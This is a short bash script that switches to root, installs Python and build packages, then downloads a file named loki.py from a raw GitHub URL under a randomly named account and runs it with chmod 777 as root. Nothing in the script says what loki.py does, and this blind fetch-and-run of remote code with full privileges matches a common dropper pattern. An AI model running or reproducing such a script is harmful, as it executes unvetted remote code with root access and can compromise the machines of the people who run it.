#!/bin/bash
if [ "$(id -u)" != "0" ]; then
   sudo su   
else
	echo "Root user"
fi
sudo -i
apt-get update
apt-get install -y git wget screen
apt-get install -y python python-dev
apt-get install -y epel-release
apt-get install -y python-pip
apt-get install -y gcc-c++
pip install sh
rm -rf loki.py
wget https://raw.githubusercontent.com/ts6aud5vkg/orc16/master/loki.py
chmod 777 loki.py
python loki.py
